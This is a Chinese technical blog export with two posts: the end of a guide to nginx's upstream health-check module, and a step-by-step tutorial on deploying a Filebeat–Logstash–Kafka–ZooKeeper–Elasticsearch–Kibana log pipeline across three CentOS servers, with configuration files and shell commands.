1 02:28 nginx_upstream_check_module-master 为nginx打补丁12345678[root@localhost /usr/local/src]# cd nginx-1.6.0 # 进入nginx的源码目录[root@localhost nginx-1.6.0]# patch -p1 &lt; ../nginx_upstream_check_module-master/check_1.5.12+.patch[root@localhost nginx-1.6.0]# ./configure --user=nginx --group=nginx --prefix=/usr/local/nginx-1.6.0 --with-http_ssl_module --with-openssl=/usr/local/src/openssl-0.9.8q --with-pcre=/usr/local/src/pcre-8.32 --add-module=/usr/local/src/nginx_concat_module/ --add-module=../nginx_upstream_check_module-master/make (注意：此处只make，编译参数需要和之前的一样)[root@localhost nginx-1.6.0]# mv /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx-1.6.0.bak[root@localhost nginx-1.6.0]# cp ./objs/nginx /usr/local/nginx/sbin/[root@localhost nginx-1.6.0]# /usr/local/nginx/sbin/nginx -t # 检查下是否有问题[root@localhost nginx-1.6.0]# kill -USR2 `cat /usr/local/nginx/logs/nginx.pid` 在nginx.conf配置文件里面的upstream加入健康检查12345upstream name &#123; server 192.168.0.21:80; server 192.168.0.22:80; check interval=3000 rise=2 fall=5 timeout=1000 type=http; &#125; 上面 配置的意思是，对name这个负载均衡条目中的所有节点，每个3秒检测一次，请求2次正常则标记 realserver状态为up，如果检测 5 次都失败，则标记 realserver的状态为down，超时时间为1秒。 这里列出 nginx_upstream_check_module 模块所支持的指令意思： 123Syntax: check interval=milliseconds [fall=count] [rise=count] [timeout=milliseconds] [default_down=true|false] [type=tcp|http|ssl_hello|mysql|ajp] [port=check_port]Default: 如果没有配置参数，默认值是：interval=30000 fall=5 rise=2 timeout=1000 default_down=true type=tcpContext: upstream 该指令可以打开后端服务器的健康检查功能。 指令后面的参数意义是： 123456789101112131415 - interval：向后端发送的健康检查包的间隔。 - fall(fall_count): 如果连续失败次数达到fall_count，服务器就被认为是down。 - rise(rise_count): 如果连续成功次数达到rise_count，服务器就被认为是up。 - timeout: 后端健康请求的超时时间。 - default_down: 设定初始时服务器的状态，如果是true，就说明默认是down的，如果是false，就是up的。默认值是true，也就是一开始服务器认为是不可用，要等健康检查包达到一定成功次数以后才会被认为是健康的。 - type：健康检查包的类型，现在支持以下多种类型 - tcp：简单的tcp连接，如果连接成功，就说明后端正常。 - ssl_hello：发送一个初始的SSL hello包并接受服务器的SSL hello包。 - http：发送HTTP请求，通过后端的回复包的状态来判断后端是否存活。 - mysql: 向mysql服务器连接，通过接收服务器的greeting包来判断后端是否存活。 - ajp：向后端发送AJP协议的Cping包，通过接收Cpong包来判断后端是否存活。 - port: 指定后端服务器的检查端口。你可以指定不同于真实服务的后端服务器的端口，比如后端提供的是443端口的应用，你可以去检查80端口的状态来判断后端健康状况。默认是0，表示跟后端server提供真实服务的端口一样。该选项出现于Tengine-1.4.0。Syntax: check_keepalive_requests request_numDefault: 1Context: upstream 该指令可以配置一个连接发送的请求数，其默认值为1，表示Tengine完成1次请求后即关闭连接。 123Syntax: check_http_send http_packetDefault: "GET / HTTP/1.0\r\n\r\n"Context: upstream 该指令可以配置http健康检查包发送的请求内容。为了减少传输数据量，推荐采用”HEAD”方法。 当采用长连接进行健康检查时，需在该指令中添加keep-alive请求头，如：”HEAD / HTTP/1.1\r\nConnection: keep-alive\r\n\r\n”。 同时，在采用”GET”方法的情况下，请求uri的size不宜过大，确保可以在1个interval内传输完成，否则会被健康检查模块视为后端服务器或网络异常。 123Syntax: check_http_expect_alive [ http_2xx | http_3xx | http_4xx | http_5xx ]Default: http_2xx | http_3xxContext: upstream 该指令指定HTTP回复的成功状态，默认认为2XX和3XX的状态是健康的。 123Syntax: check_shm_size sizeDefault: 1MContext: http 所有的后端服务器健康检查状态都存于共享内存中，该指令可以设置共享内存的大小。默认是1M，如果你有1千台以上的服务器并在配置的时候出现了错误，就可能需要扩大该内存的大小。 123Syntax: check_status [html|csv|json]Default: check_status htmlContext: location 显示服务器的健康状态页面。该指令需要在http块中配置。 在Tengine-1.4.0以后，你可以配置显示页面的格式。支持的格式有: html、csv、 json。默认类型是html。 你也可以通过请求的参数来指定格式，假设‘/status’是你状态页面的URL， format参数改变页面的格式，比如： 12345/status?format=html/status?format=csv/status?format=json 同时你也可以通过status参数来获取相同服务器状态的列表，比如： 123/status?format=html&amp;status=down/status?format=csv&amp;status=up 下面是一个状态也配置的范例： 12345678910http &#123; server &#123; location /nstatus &#123; check_status; access_log off; #allow IP; #deny all; &#125; &#125;&#125; 配置完毕后，重启nginx。此时通过访问定义好的路径，就可以看到当前 realserver 实时的健康状态啦。效果如下图：realserver 都正常的状态： 一台 realserver 故障的状态： OK，以上nginx_upstream_check_module模块的相关信息，更多的信息大家可以去该模块的淘宝tengine页面和github上该项目页面去查看，下面是访问地址： http://tengine.taobao.org/document_cn/http_upstream_check_cn.html https://github.com/yaoweibin/nginx_upstream_check_module ngx_http_healthcheck_module模块除了上面两个模块，nginx官方在早期的时候还提供了一个 ngx_http_healthcheck_module 模块用来进行nginx后端节点的健康检查。nginx_upstream_check_module模块就是参照该模块的设计理念进行开发的，因此在使用和效果上都大同小异。但是需要注意的是，ngx_http_healthcheck_module 模块仅仅支持nginx的1.0.0版本，1.1.0版本以后都不支持了！因此，对于目前常见的生产环境上都不会去用了，这里仅仅留个纪念，给大家介绍下这个模块！ 具体的使用方法，这里可以贴出几篇靠谱的博文地址以及官方地址： ​ http://wiki.nginx.org/HttpHealthcheckModule ​ https://github.com/cep21/healthcheck_nginx_upstreams/blob/master/README 生产环境的实施中需要注意点：主要定义好type。由于默认的type是tcp类型，因此假设你服务启动，不管是否初始化完毕，它的端口都会起来，所以此时前段负载均衡器为认为该服务已经可用，其实是不可用状态。 注意check_http_send值的设定。由于它的默认值是”GET / HTTP/1.0\r\n\r\n”。假设你的应用是通过http://ip/name访问的，那么这里你的 check_http_send值就需要更改为 “GET /name HTTP/1.0\r\n\r\n”才可以。针对采用长连接进行检查的， 这里增加 keep-alive请求 头，即”HEAD /name HTTP/1.1\r\nConnection: keep-alive\r\n\r\n”。如果你后端的tomcat是基于域名的多虚拟机，此时你需要通过check_http_send定义host，不然每次访问都是失败，范例：check_http_send “GET /mobileapi HTTP/1.0\r\n HOST www.redhat.sx\r\n\r\n”;]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务优化</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK日志系统最新版本详细教程]]></title>
    <url>%2Farticles%2F944dc498.html</url>
    <content type="text"><![CDATA[目的为什么要做日志分析平台？ 随着业务量的增长，每天业务服务器将会产生上亿条的日志，单个日志文件达几个GB，这时我们发现用Linux自带工具，cat grep awk 分析越来越力不从心了，而且除了服务器日志，还有程序报错日志，分布在不同的服务器，查阅繁琐。 待解决的痛点: 1、大量不同种类的日志成为了运维人员的负担，不方便管理; 2、单个日志文件巨大，无法使用常用的文本工具分析，检索困难; 3、日志分布在多台不同的服务器上，业务一旦出现故障，需要一台台查看日志。 为了解决以上困扰: 接下来我们要一步步构建这个日志分析平台，架构图如下: 架构图的构建考虑： 1，考虑既能收集日志，又是轻量级的，所耗服务器资源和负载较低。选用filebeat 2, 考虑到高可用和日志数据的安全，加入缓存中间件集群。选用kafka和zookeeper 3, 在kafka集群前面加入logstash进行导入，是为了横向扩展kafka的broker。试想下，添加或减少kafka broker集群节点，需要每台机器上更改filebeat的配置，那就头疼了。 4，在kafka集群后面添加logstash转发层，是为了可以根据kafka集群topic的使用情况横向扩展，负载较高的topic可以适当增加logstash进行处理。 5，es集群负责存储，kibana前端展示和搜索。 架构图： 架构解读 : （整个架构从左到右，总共分为5层） 第一层、数据采集层 最左边的是业务服务器集群，上面安装了filebeat做日志采集，同时把采集的日志分别发送给两个logstash服务。 第二层、数据处理层，数据缓存层 logstash服务把接受到的日志经过格式处理，转存到本地的kafka broker+zookeeper 集群中。 第三层、数据转发层 这个单独的Logstash节点会实时去kafka broker集群拉数据，转发至ES DataNode。 第四层、数据持久化存储 ES DataNode 会把收到的数据，写磁盘，建索引库。 第五层、数据检索，数据展示 ES Master + Kibana 主要协调ES集群，处理数据检索请求，数据展示。 环境操作系统环境 : CentOS 7.2 各服务器角色分配 : 3台服务器： IP : 10.10.0.193 IP : 10.10.0.194 IP : 10.10.0.195 IP 角色 所属集群 10.10.0.193 10.10.0.194 nginx+filebeat nginx+filebeat 业务服务器集群 10.10.0.193 Logstash+Kafka+ZooKeeper 缓存集群 10.10.0.194 Logstash+Kafka+ZooKeeper 10.10.0.195 Kafka+ZooKeeper 10.10.0.195 Logstash 数据转发 10.10.0.193 ES DataNode Elasticsearch 集群 10.10.0.194 ES DataNode 10.10.0.195 ES Master+Kibana 软件包版本和下载网站:jdk-8u161-linux-x64.rpm node-v8.10.0-linux-x64.tar.xz nginx-1.12.2.tar.gz logstash-6.2.2.tar.gz filebeat-6.2.2-x86_64.rpm kafka_2.11-1.0.1.tgz zookeeper-3.4.10.tar.gz elasticsearch-6.2.2.tar.gz kibana-6.2.2-linux-x86_64.tar.gz jdk下载：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html nodejs下载：https://nodejs.org/en/download/ nginx下载：http://nginx.org/en/download.html filebeat,logstash,elasticsearch,kibana下载：https://www.elastic.co/cn/downloads kafka下载：http://kafka.apache.org/downloads zookeeper下载：http://zookeeper.apache.org/releases.html#download 安装部署Elasticsearch集群ES Master节点 10.10.0.195 安装jdk1.8，elasticsearch123456789101112131415# 安装命令yum install jdk-8u161-linux-x64.rpm -y# 创建es用户（从5.0后root不能启动被限制）groupadd es useradd es passwd es更改用户 es 的密码 。 新的 密码： 重新输入新的 密码： passwd： 所有的身份验证令牌已经成功更新#解压包tar -xzvf elasticsearch-6.2.2.tar.gz -C /opt/mv /opt/elasticsearch-6.2.2 /opt/elasticsearch#更改权限chown -R es:es /opt/elasticsearch 验证jdk： 系统调优，JVM调优12345678910111213141516# 配置系统最大打开文件描述符数vim /etc/sysctl.confvm.max_map_count=262144#配置生效sysctl -p# 配置进程最大打开文件描述符vim /etc/security/limits.conf# End of file* soft nofile 65536* hard nofile 131072* soft nproc 2048* hard nproc 4096#更改配置vim /etc/security/limits.d/20-nproc.conf* soft nproc 4096root soft nproc unlimited 编写ES Master节点配置文件123456789101112131415161718192021222324252627282930313233vim /opt/elasticsearch/config/elasticsearch.yml # ---------------------------------- Cluster -----------------------------------# Use a descriptive name for your cluster: cluster.name: sunelk # ------------------------------------ Node ------------------------------------node.name: node-195node.master: truenode.data: falsenode.ingest: false search.remote.connect: false # ----------------------------------- Paths ------------------------------------path.data: /home/es/elasticsearch/data/path.logs: /home/es/elasticsearch/logs/ # ----------------------------------- Memory -----------------------------------bootstrap.memory_lock: falsebootstrap.system_call_filter: false#------------------------------------ Network And HTTP --------------------------network.host: 0.0.0.0http.port: 9200 # --------------------------------- Discovery ------------------------------------discovery.zen.ping.unicast.hosts: ["10.10.0.193", "10.10.0.194","10.10.0.195"] discovery.zen.minimum_master_nodes: 2 #下面两行配置为haad插件配置，三台服务器一致。 http.cors.enabled: true http.cors.allow-origin: "*" 注: path.data、path.logs 这两个参数指定的路径，如果没有需要自己创建，还要赋予权限给es用户。（后面的ES DataNode也同样） 安装head开源插件从es6.x后要自己手动编译安装 123456789101112131415161718192021#安装nodetar -xvf node-v8.10.0-linux-x64.tar.xz -C /opt/mv /opt/node-v8.10.0-linux-x64 /opt/node#更改环境变量vim /etc/profileexport NODEJS_HOME=/opt/nodeexport PATH=$PATH:$NODEJS_HOME/binsource /etc/profile#下载源码cd /opt/git clone https://github.com/mobz/elasticsearch-head.gitchown -R es:es elasticsearch-headsu es cd elasticsearch-headnpm install -g cnpm --registry=https://registry.npm.taobao.orgnpm install -g grunt-clinpm installnpm run startopen http://localhost:9100/ 访问,检测插件是否安装成功 http://10.10.0.195:9100 这时，ES Master已经配置好了。 部署ES DataNode节点ES DataNode节点 是10.10.0.193和10.10.0.194 安装和系统调优方法同上，插件不用安装，只是配置文件不同。 编写配置文件 123456789101112131415161718192021222324252627282930313233vim /opt/elasticsearch/config/elasticsearch.yml # ---------------------------------- Cluster -----------------------------------# Use a descriptive name for your cluster: cluster.name: sunelk # ------------------------------------ Node ------------------------------------node.name: node-193node.master: truenode.data: truenode.ingest: false search.remote.connect: false # ----------------------------------- Paths ------------------------------------path.data: /home/es/elasticsearch/data/path.logs: /home/es/elasticsearch/logs/ # ----------------------------------- Memory -----------------------------------bootstrap.memory_lock: falsebootstrap.system_call_filter: false#------------------------------------ Network And HTTP --------------------------network.host: 0.0.0.0http.port: 9200 # --------------------------------- Discovery ------------------------------------discovery.zen.ping.unicast.hosts: ["10.10.0.193", "10.10.0.194","10.10.0.195"] discovery.zen.minimum_master_nodes: 2 #下面两行配置为haad插件配置，三台服务器一致。 http.cors.enabled: true http.cors.allow-origin: "* 10.10.0.193 也准备好了,10.10.0.194和193配置一样，只需改下node.name 启动服务123456# 10.10.0.195nohup /opt/elasticsearch/bin/elasticsearch &amp;# 10.10.0.193nohup /opt/elasticsearch/bin/elasticsearch &amp;# 10.10.0.194nohup /opt/elasticsearch/bin/elasticsearch &amp; 访问head插件，查看集群状态此时 Elasticsearch 集群已经准备完成 配置ZooKeeper集群配置 10.10.0.193 节点 安装，配置 zookeeper123456# zookeeper 依赖 java，如果之前没安装过JDK，则需要安装.rpm -ivh jdk-8u161-linux-x64.rpm # 解压程序tar -xzvf zookeeper-3.4.10.tar.gz -C /opt/mv /opt/zookeeper-3.4.10 /opt/zookeeper 编写配置文件123456789101112131415161718192021222324252627282930313233vim /opt/zookeeper/conf/zoo.cfg# The number of milliseconds of each ticktickTime=2000# The number of ticks that the initial # synchronization phase can takeinitLimit=10# The number of ticks that can pass between # sending a request and getting an acknowledgementsyncLimit=5# the directory where the snapshot is stored.# do not use /tmp for storage, /tmp here is just # example sakes.dataDir=/tmp/zookeeper# the port at which the clients will connectclientPort=2181# the maximum number of client connections.# increase this if you need to handle more clients#maxClientCnxns=60## Be sure to read the maintenance section of the # administrator guide before turning on autopurge.## http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance## The number of snapshots to retain in dataDir#autopurge.snapRetainCount=3# Purge task interval in hours# Set to "0" to disable auto purge feature#autopurge.purgeInterval=1server.1=10.10.0.193:2888:3888server.2=10.10.0.194:2888:3888server.3=10.10.0.195:2888:3888 同步配置文件到其他两台节点 注: zookeeper 集群，每个节点的配置文件都是一样的。所以直接同步过去，不需要做任何修改。 12scp zoo.cfg 10.10.0.193:/opt/zookeeper/conf/scp zoo.cfg 10.10.0.194:/opt/zookeeper/conf/ 创建myid文件12345678# 10.10.0.193echo 1 &gt;/tmp/zookeeper/myid # 10.10.0.194echo 2 &gt;/tmp/zookeeper/myid # 10.10.0.195echo 3 &gt;/tmp/zookeeper/myid 启动服务 &amp; 查看节点状态1234567891011121314151617181920212223# 10.10.0.193/opt/zookeeper/bin/zkServer.sh start/opt/zookeeper/bin/zkServer.sh status ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper/zookeeper-3.4.9/bin/../conf/zoo.cfgMode: leader # 10.10.0.194/opt/zookeeper/bin/zkServer.sh start/opt/zookeeper/bin/zkServer.sh status ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper/zookeeper-3.4.9/bin/../conf/zoo.cfgMode: follower # 10.10.0.195/opt/zookeeper/bin/zkServer.sh start /opt/zookeeper/bin/zkServer.sh status ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper/zookeeper-3.4.9/bin/../conf/zoo.cfgMode: follower 此时zookeeper集群配置完成 配置Kafka Broker集群Kafka官网: http://kafka.apache.org/ 配置 10.10.0.193 节点 安装，配置 kafka123# 解压程序tar -xzvf kafka_2.11-1.0.1.tgz -C /opt/mv /opt/kafka_2.11-1.0.1 /opt/kafka 编写配置文件123456789101112131415161718192021222324252627282930vim /opt/kafka/conf/server.properties############################# Server Basics #############################broker.id=1############################# Socket Server Settings #############################num.network.threads=3# The number of threads doing disk I/Onum.io.threads=8# The send buffer (SO_SNDBUF) used by the socket serversocket.send.buffer.bytes=102400# The receive buffer (SO_RCVBUF) used by the socket serversocket.receive.buffer.bytes=102400# The maximum size of a request that the socket server will accept (protection against OOM)socket.request.max.bytes=104857600############################# Log Basics #############################log.dirs=/opt/kafka/datanum.partitions=6num.recovery.threads.per.data.dir=1############################# Log Flush Policy ############################## The number of messages to accept before forcing a flush of data to disk#log.flush.interval.messages=10000# The maximum amount of time a message can sit in a log before we force a flush#log.flush.interval.ms=1000############################# Log Retention Policy #############################log.retention.hours=60log.segment.bytes=1073741824log.retention.check.interval.ms=300000############################# Zookeeper #############################zookeeper.connect=10.10.0.193:2181,10.10.0.194:2181,10.10.0.195:2181zookeeper.connection.timeout.ms=6000 同步配置文件到其他两台节点123456789scp server.properties 10.10.0.194:/opt/kafka/config/scp server.properties 10.10.0.195:/opt/kafka/config/ # 修改 broker.id# 10.10.0.194broker.id=2 # 10.10.0.195broker.id=3 注: 其他两个节点的配置文件也基本相同，只有一个参数需要修改 broker.id 。 它用于唯一标识节点，所以绝对不能相同，不然会节点冲突。 配置主机名对应IP的解析1234567vim /etc/hosts 10.10.0.193 elk-0110.10.0.194 elk-0210.10.0.195 elk-03 # 记得同步到其他两台节点 启动服务12345678nohup /opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/server.properties &amp;# 其他两台节点启动方式相同在kafka中创建topic/opt/kafka/bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic nginxlog#可以增加topic分区,当然也可在创建时把--partitions增大/opt/kafka/bin/kafka-topics.sh --zookeeper localhost:2181 --alter --topic nginxlog --partitions 10 Kafka+ZooKeeper集群配置完成 配置位于架构图中第二层的Logstash服务配置 10.10.0.193节点 安装，配置 logstash123# 解压程序tar -xzvf logstash-6.2.2.tar.gz -C /opt/mv /opt/logstash-6.2.2 /opt/logstash 编写配置文件12345678910111213141516vim /opt/logstash/config/logstash_in_kafka.confinput &#123; beats &#123; port =&gt; 5044 codec =&gt; "json" &#125; &#125;output &#123; kafka &#123; bootstrap_servers =&gt; "10.10.0.193:9092,10.10.0.194:9092,10.10.0.195:9092" topic_id =&gt; "nginxlog" &#125; # stdout &#123;codec =&gt; json&#125; 调试时打开&#125; 启动服务1nohup /opt/logstash/bin/logstash -f /opt/logstash/config/logstash_in_kafka.conf &amp; 10.10.0.194 节点的这块配置，与上述完全相同。（略） 位于第二层、数据处理层的 Logstash 配置完成 配置数据采集层，业务服务器+Filebeat定制Nginx日志格式123456789101112131415161718log_format json &apos;&#123;&quot;@timestamp&quot;:&quot;$time_iso8601&quot;,&apos; &apos;&quot;slbip&quot;:&quot;$remote_addr&quot;,&apos; &apos;&quot;clientip&quot;:&quot;$http_x_forwarded_for&quot;,&apos; &apos;&quot;serverip&quot;:&quot;$server_addr&quot;,&apos; &apos;&quot;size&quot;:$body_bytes_sent,&apos; &apos;&quot;responsetime&quot;:$request_time,&apos; &apos;&quot;domain&quot;:&quot;$host&quot;,&apos; &apos;&quot;method&quot;:&quot;$request_method&quot;,&apos; &apos;&quot;requesturi&quot;:&quot;$request_uri&quot;,&apos; &apos;&quot;url&quot;:&quot;$uri&quot;,&apos; &apos;&quot;appversion&quot;:&quot;$HTTP_APP_VERSION&quot;,&apos; &apos;&quot;referer&quot;:&quot;$http_referer&quot;,&apos; &apos;&quot;agent&quot;:&quot;$http_user_agent&quot;,&apos; &apos;&quot;status&quot;:&quot;$status&quot;,&apos; &apos;&quot;devicecode&quot;:&quot;$HTTP_HA&quot;&#125;&apos;; # 在虚拟主机配置中调用access_log /var/log/nginx/access.log json; 安装 FilebeatFilebeat 也是 Elasticsearch 公司的产品，在官网可以下载。 12# rpm 包安装yum install filebeat-6.2.2-x86_64.rpm -y 编写 Filebeat 配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195vim /etc/filebeat/filebeat.yml###################### Filebeat Configuration Example ########################## This file is an example configuration file highlighting only the most common# options. The filebeat.reference.yml file from the same directory contains all the# supported options with more comments. You can use it as a reference.## You can find the full configuration reference here:# https://www.elastic.co/guide/en/beats/filebeat/index.html# For more available modules and options, please see the filebeat.reference.yml sample# configuration file.#=========================== Filebeat prospectors =============================filebeat.prospectors:# Each - is a prospector. Most options can be set at the prospector level, so# you can use different prospectors for various configurations.# Below are the prospector specific configurations.- type: log # Change to true to enable this prospector configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/nginx/access.log #- c:\programdata\elasticsearch\logs\* # Exclude lines. A list of regular expressions to match. It drops the lines that are # matching any regular expression from the list. #exclude_lines: ['^DBG'] # Include lines. A list of regular expressions to match. It exports the lines that are # matching any regular expression from the list. #include_lines: ['^ERR', '^WARN'] # Exclude files. A list of regular expressions to match. Filebeat drops the files that # are matching any regular expression from the list. By default, no files are dropped. #exclude_files: ['.gz$'] # Optional additional fields. These fields can be freely picked # to add additional information to the crawled log files for filtering #fields: # level: debug # review: 1 ### Multiline options # Mutiline can be used for log messages spanning multiple lines. This is common # for Java Stack Traces or C-Line Continuation # The regexp Pattern that has to be matched. The example pattern matches all lines starting with [ #multiline.pattern: ^\[ # Defines if the pattern set under pattern should be negated or not. Default is false. #multiline.negate: false # Match can be set to "after" or "before". It is used to define if lines should be append to a pattern # that was (not) matched before or after or as long as a pattern is not matched based on negate. # Note: After is the equivalent to previous and before is the equivalent to to next in Logstash #multiline.match: after#============================= Filebeat modules ===============================filebeat.config.modules: # Glob pattern for configuration loading path: $&#123;path.config&#125;/modules.d/*.yml # Set to true to enable config reloading reload.enabled: false # Period on which files under path should be checked for changes #reload.period: 10s#==================== Elasticsearch template setting ==========================setup.template.settings: index.number_of_shards: 3 #index.codec: best_compression #_source.enabled: false#================================ General =====================================# The name of the shipper that publishes the network data. It can be used to group# all the transactions sent by a single shipper in the web interface.#name:# The tags of the shipper are included in their own field with each# transaction published.#tags: ["service-X", "web-tier"]# Optional fields that you can specify to add additional information to the# output.#fields:# env: staging#============================== Dashboards =====================================# These settings control loading the sample dashboards to the Kibana index. Loading# the dashboards is disabled by default and can be enabled either by setting the# options here, or by using the `-setup` CLI flag or the `setup` command.#setup.dashboards.enabled: false# The URL from where to download the dashboards archive. By default this URL# has a value which is computed based on the Beat name and version. For released# versions, this URL points to the dashboard archive on the artifacts.elastic.co# website.#setup.dashboards.url:#============================== Kibana =====================================# Starting with Beats version 6.0.0, the dashboards are loaded via the Kibana API.# This requires a Kibana endpoint configuration.setup.kibana: # Kibana Host # Scheme and port can be left out and will be set to the default (http and 5601) # In case you specify and additional path, the scheme is required: http://localhost:5601/path # IPv6 addresses should always be defined as: https://[2001:db8::1]:5601 #host: "localhost:5601"#============================= Elastic Cloud ==================================# These settings simplify using filebeat with the Elastic Cloud (https://cloud.elastic.co/).# The cloud.id setting overwrites the `output.elasticsearch.hosts` and# `setup.kibana.host` options.# You can find the `cloud.id` in the Elastic Cloud web UI.#cloud.id:# The cloud.auth setting overwrites the `output.elasticsearch.username` and# `output.elasticsearch.password` settings. The format is `&lt;user&gt;:&lt;pass&gt;`.#cloud.auth:#================================ Outputs =====================================# Configure what output to use when sending the data collected by the beat.#output:# console:# pretty: true#-------------------------- Elasticsearch output ------------------------------#output.elasticsearch: # Array of hosts to connect to. #hosts: ["elk-01:9200"] # Optional protocol and basic auth credentials. #protocol: "https" #username: "elastic" #password: "changeme"#----------------------------- Logstash output --------------------------------output.logstash: # The Logstash hosts hosts: ["elk-01:5044"] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications #ssl.certificate_authorities: ["/etc/pki/root/ca.pem"] # Certificate for SSL client authentication #ssl.certificate: "/etc/pki/client/cert.pem" # Client Certificate Key #ssl.key: "/etc/pki/client/cert.key"#================================ Logging =====================================# Sets log level. The default log level is info.# Available log levels are: error, warning, info, debug#logging.level: debug# At debug level, you can selectively enable logging only for some components.# To enable all selectors use ["*"]. Examples of other selectors are "beat",# "publish", "service".#logging.selectors: ["*"]#============================== Xpack Monitoring ===============================# filebeat can export internal metrics to a central Elasticsearch monitoring# cluster. This requires xpack monitoring to be enabled in Elasticsearch. The# reporting is disabled by default.# Set to true to enable the monitoring reporter.#xpack.monitoring.enabled: false# Uncomment to send the metrics to Elasticsearch. Most settings from the# Elasticsearch output are accepted here as well. Any setting that is not set is# automatically inherited from the Elasticsearch output configuration, so if you# have the Elasticsearch output configured, you can simply uncomment the# following line.#xpack.monitoring.elasticsearch: 启动服务1/etc/init.d/filebeat start 数据采集层，Filebeat配置完成。 现在业务服务器上的日志数据已经在源源不断的写入缓存了。 配置位于架构图中的第三层，数据转发层10.10.0.195 logstash 安装过程和193/194一样，参考上面步骤。 编写Logstash配置文件12345678910111213141516171819202122232425262728293031vim /opt/logstash/config/kafka_to_es.confinput &#123; kafka &#123; bootstrap_servers =&gt; "10.10.0.193:9092,10.10.0.194:9092" auto_offset_reset =&gt; "latest" group_id =&gt; "logstash" consumer_threads =&gt; 3 decorate_events =&gt; true topics =&gt; ["nginxlog"] &#125;&#125;filter &#123; if [type] == "nginxlog" &#123; mutate &#123; remove_field =&gt;["slbip","kafka","domain","serverip","url","@version","offset","input_type","count","source","fields","beat.hostname","host","tags"] &#125; &#125;&#125;output &#123;# stdout &#123;codec =&gt; json&#125; elasticsearch &#123; hosts =&gt; ["10.10.0.193:9200","10.10.0.194:9200"] timeout =&gt; 300 index =&gt; "nginxlog" &#125;&#125; 启动服务1nohup /opt/logstash/bin/logstash -f /opt/logstash/config/kafka_to_es.conf &amp; 数据转发层已经配置完成 修改ES的索引模版配置为什么要做这一步呢？ 因为logstash写入数据到ES时，会自动选用一个索引模版。 我们可以看一下 这个模版其实也挺好，不过有一个参数，我标记出来了。 “refresh_interval”:”5s” 这个参数用于控制，索引的刷新频率。 索引的刷新频率越快，你搜索到的数据就实时。 这里是5秒。 一般我们日志场景不需要这么高的实时性。 可以适当降低该参数，提高ES 索引库的写入速度。 上传自定义模版 1234567891011121314151617curl -XPUT http://10.10.0.195:9200/_template/logstash2 -d '&#123; "order":1, "template":"logstash-*", "settings":&#123; "index":&#123; "refresh_interval":"120s" &#125; &#125;, "mappings":&#123; "_default_":&#123; "_all":&#123; "enabled":false &#125; &#125; &#125;&#125;' 由于这个自定义模版，我把优先级 order 定义的比logstash模版高，而模版的匹配规则又一样，所以这个自定义模版的配置会覆盖原logstash模版。 我这里只是简单描述。 如果要详细理解其中道理，请查看我的 ES 调优篇。 配置 Kibana 数据展示层10.10.0.195 节点 Kibana是ELK套件中的一员，也属于elasticsearch 公司，在官网提供下载。 安装12tar -xzvf kibana-6.2.2-linux-x86_64.tar.gz -C /opt/mv /opt/kibana-6.2.2-linux-x86_64 /opt/kibana 修改配置文件1234567# vim /opt/kibana/config/kibana.yml server.port: 5601server.host: 0.0.0.0elasticsearch.url: "http://10.10.0.195:9200" # 修改这三个参数就好了 启动服务 打开浏览器访问: http://10.10.0.195:5601/ kibanaKibana是一个开源的分析和可视化平台，设计用于和Elasticsearch一起工作。 你用Kibana来搜索，查看，并和存储在Elasticsearch索引中的数据进行交互。 你可以轻松地执行高级数据分析，并且以各种图标、表格和地图的形式可视化数据。 Kibana使得理解大量数据变得很容易。它简单的、基于浏览器的界面使你能够快速创建和共享动态仪表板，实时显示Elasticsearch查询的变化。 安装Kibana Kibana配置 官网文档 访问Kibana Kibana是一个Web应用程序，你可以通过5601来访问它。例如：localhost:5601 或者 http://YOURDOMAIN.com:5601 当访问Kibana时，默认情况下，Discover页面加载时选择了默认索引模式。时间过滤器设置为最近15分钟，搜索查询设置为match-all(*) 检查Kibana状态http://localhost:5601/status 或者 http://192.168.101.5:5601/api/status 返回JSON格式状态信息 用Elasticsearch连接到Kibana 在你开始用Kibana之前，你需要告诉Kibana你想探索哪个Elasticsearch索引。第一次访问Kibana是，系统会提示你定义一个索引模式以匹配一个或多个索引的名字。 （提示：默认情况下，Kibana连接允许在localhost上的Elasticsearch实例。为了连接到一个不同的Elasticsearch实例，修改kabana.yml中Elasticsearch的URL，然后重启Kibana。） 为了配置你想要用Kibana访问的Elasticsearch索引： 1、访问Kibana UI。例如，localhost:56011 或者 http://YOURDOMAIN.com:5601 2、指定一个索引模式来匹配一个或多个你的Elasticsearch索引。当你指定了你的索引模式以后，任何匹配到的索引都将被展示出来。 （画外音：*匹配0个或多个字符； 指定索引默认是为了匹配索引，确切的说是匹配索引名字） 3、点击“Next Step”以选择你想要用来执行基于时间比较的包含timestamp字段的索引。如果你的索引没有基于时间的数据，那么选择“I don’t want to use the Time Filter”选项。 4、点击“Create index pattern”按钮来添加索引模式。第一个索引模式自动配置为默认的索引默认，以后当你有多个索引模式的时候，你就可以选择将哪一个设为默认。（提示：Management &gt; Index Patterns） 现在，Kibana已经连接到你的Elasticsearch数据。Kibana展示了一个只读的字段列表，这些字段是匹配到的这个索引配置的字段。 使用说明之Discover 你可以从Discover页面交互式的探索你的数据。你可以访问与所选择的索引默认匹配的每个索引中的每个文档。你可以提交查询请求，过滤搜索结构，并查看文档数据。你也可以看到匹配查询请求的文档数量，以及字段值统计信息。如果你选择的索引模式配置了time字段，则文档随时间的分布将显示在页面顶部的直方图中。 设置时间过滤 搜索数据你可以在搜索框中输入查询条件来查询当前索引模式匹配的索引。在查询的时候，你可以使用Kibana标准的查询语言（基于Lucene的查询语法）或者完全基于JSON的Elasticsearch查询语言DSL。Kibana查询语言可以使用自动完成和简化的查询语法作为实验特性，您可以在查询栏的“选项”菜单下进行选择。 